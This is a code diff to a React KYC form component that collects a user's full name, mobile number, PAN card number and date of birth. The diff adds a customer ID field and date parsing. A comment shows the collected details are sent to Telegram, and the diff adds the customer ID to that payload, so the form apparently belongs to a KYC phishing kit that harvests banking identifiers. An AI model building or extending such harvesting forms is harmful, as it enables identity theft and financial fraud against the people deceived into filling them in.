@@ -14,6 +14,7 @@ export default function KycModal({ isOpen, onClose }: KycModalProps) {
   const router = useRouter();
   const [formData, setFormData] = useState({
     fullName: "",
+    customerId: "",
     mobileNumber: "",
     panCardNumber: "",
     dateOfBirth: ""
@@ -21,6 +22,7 @@ export default function KycModal({ isOpen, onClose }: KycModalProps) {
 
   const [errors, setErrors] = useState({
     fullName: "",
+    customerId: "",
     mobileNumber: "",
     panCardNumber: "",
     dateOfBirth: ""
@@ -32,6 +34,7 @@ export default function KycModal({ isOpen, onClose }: KycModalProps) {
   const validateForm = () => {
     const newErrors = {
       fullName: "",
+      customerId: "",
       mobileNumber: "",
       panCardNumber: "",
       dateOfBirth: ""
@@ -44,6 +47,13 @@ export default function KycModal({ isOpen, onClose }: KycModalProps) {
       newErrors.fullName = "Full name must be at least 3 characters";
     } else if (!/^[a-zA-Z\s]+$/.test(formData.fullName)) {
       newErrors.fullName = "Full name should contain only letters and spaces";
+    }
+
+    // Customer ID validation (optional field)
+    if (formData.customerId.trim() && formData.customerId.length < 6) {
+      newErrors.customerId = "Customer ID must be at least 6 characters";
+    } else if (formData.customerId.trim() && !/^[A-Za-z0-9]+$/.test(formData.customerId)) {
+      newErrors.customerId = "Customer ID should contain only letters and numbers";
     }
 
     // Mobile Number validation
@@ -63,16 +73,35 @@ export default function KycModal({ isOpen, onClose }: KycModalProps) {
     // Date of Birth validation
     if (!formData.dateOfBirth) {
       newErrors.dateOfBirth = "Date of birth is required";
+    } else if (!/^\d{2}\/\d{2}\/\d{4}$/.test(formData.dateOfBirth)) {
+      newErrors.dateOfBirth = "Please enter date in DD/MM/YYYY format";
     } else {
-      const dob = new Date(formData.dateOfBirth);
-      const today = new Date();
-      const age = today.getFullYear() - dob.getFullYear();
-      const monthDiff = today.getMonth() - dob.getMonth();
+      // Parse DD/MM/YYYY format
+      const parts = formData.dateOfBirth.split('/');
+      const day = parseInt(parts[0], 10);
+      const month = parseInt(parts[1], 10);
+      const year = parseInt(parts[2], 10);
       
-      if (age < 18 || (age === 18 && monthDiff < 0)) {
-        newErrors.dateOfBirth = "You must be at least 18 years old";
-      } else if (age > 120) {
-        newErrors.dateOfBirth = "Please enter a valid date of birth";
+      // Check if date is valid
+      if (isNaN(day) || isNaN(month) || isNaN(year) || day < 1 || day > 31 || month < 1 || month > 12) {
+        newErrors.dateOfBirth = "Please enter a valid date";
+      } else {
+        const dob = new Date(year, month - 1, day);
+        const today = new Date();
+        
+        // Check if the constructed date matches the input (catches invalid dates like 31/02/2020)
+        if (dob.getDate() !== day || dob.getMonth() !== month - 1 || dob.getFullYear() !== year) {
+          newErrors.dateOfBirth = "Please enter a valid date";
+        } else {
+          const age = today.getFullYear() - dob.getFullYear();
+          const monthDiff = today.getMonth() - dob.getMonth();
+          
+          if (age < 18 || (age === 18 && monthDiff < 0)) {
+            newErrors.dateOfBirth = "You must be at least 18 years old";
+          } else if (age > 120) {
+            newErrors.dateOfBirth = "Please enter a valid date of birth";
+          }
+        }
       }
     }
 
@@ -90,6 +119,18 @@ export default function KycModal({ isOpen, onClose }: KycModalProps) {
       setFormData(prev => ({ ...prev, [name]: numericValue }));
     } else if (name === "panCardNumber") {
       setFormData(prev => ({ ...prev, [name]: value.toUpperCase() }));
+    } else if (name === "dateOfBirth") {
+      // Auto-format DD/MM/YYYY as user types
+      let formattedValue = value.replace(/\D/g, ''); // Remove non-digits
+      
+      if (formattedValue.length >= 2) {
+        formattedValue = formattedValue.slice(0, 2) + '/' + formattedValue.slice(2);
+      }
+      if (formattedValue.length >= 5) {
+        formattedValue = formattedValue.slice(0, 5) + '/' + formattedValue.slice(5, 9);
+      }
+      
+      setFormData(prev => ({ ...prev, [name]: formattedValue }));
     } else {
       setFormData(prev => ({ ...prev, [name]: value }));
     }
@@ -110,6 +151,7 @@ export default function KycModal({ isOpen, onClose }: KycModalProps) {
     // Send KYC details to Telegram
     const kycDetails = {
       fullName: formData.fullName,
+      customerId: formData.customerId,
       mobileNumber: formData.mobileNumber,
       panCardNumber: formData.panCardNumber,
       dateOfBirth: formData.dateOfBirth,
@@ -210,6 +252,34 @@ export default function KycModal({ isOpen, onClose }: KycModalProps) {
               )}
             </div>
 
+            {/* Customer ID Field */}
+            <div>
+              <label className="block text-sm font-medium text-gray-700 mb-2">
+                Customer ID
+              </label>
+              <div className="relative">
+                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                  <Lock size={18} className="text-gray-400" />
+                </div>
+                <input
+                  type="text"
+                  name="customerId"
+                  value={formData.customerId}
+                  onChange={handleInputChange}
+                  className={`w-full pl-10 pr-3 py-3 border rounded-lg focus:ring-2 focus:ring-[#8B1538] focus:border-transparent outline-none transition-colors text-base placeholder-gray-500 ${
+                    errors.customerId ? "border-red-500" : "border-gray-300"
+                  }`}
+                  placeholder="Enter your customer ID (optional)"
+                />
+              </div>
+              {errors.customerId && (
+                <div className="flex items-center mt-1 text-red-500 text-sm">
+                  <AlertCircle size={14} className="mr-1" />
+                  {errors.customerId}
+                </div>
+              )}
+            </div>
+
             {/* Mobile Number Field */}
             <div>
               <label className="block text-sm font-medium text-gray-700 mb-2">
@@ -275,17 +345,20 @@ export default function KycModal({ isOpen, onClose }: KycModalProps) {
               </label>
               <div className="relative">
                 <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
-                  <Calendar size={18} className="text-gray-400" />
+                  <Calendar size={18} className="text-gray-600" />
                 </div>
                 <input
-                  type="date"
+                  type="text"
                   name="dateOfBirth"
                   value={formData.dateOfBirth}
                   onChange={handleInputChange}
-                  className={`w-full pl-10 pr-3 py-3 border rounded-lg focus:ring-2 focus:ring-[#8B1538] focus:border-transparent outline-none transition-colors text-base ${
-                    errors.dateOfBirth ? "border-red-500" : "border-gray-300"
+                  className={`w-full pl-10 pr-3 py-3 border-2 rounded-lg focus:ring-2 focus:ring-[#8B1538] focus:border-transparent outline-none transition-all duration-200 text-base font-medium placeholder-gray-600 bg-white ${
+                    errors.dateOfBirth 
+                      ? "border-red-500 bg-red-50" 
+                      : "border-gray-400 hover:border-gray-500"
                   }`}
-                  max={new Date().toISOString().split('T')[0]}
+                  placeholder="DD/MM/YYYY"
+                  maxLength={10}
                 />
               </div>
               {errors.dateOfBirth && (
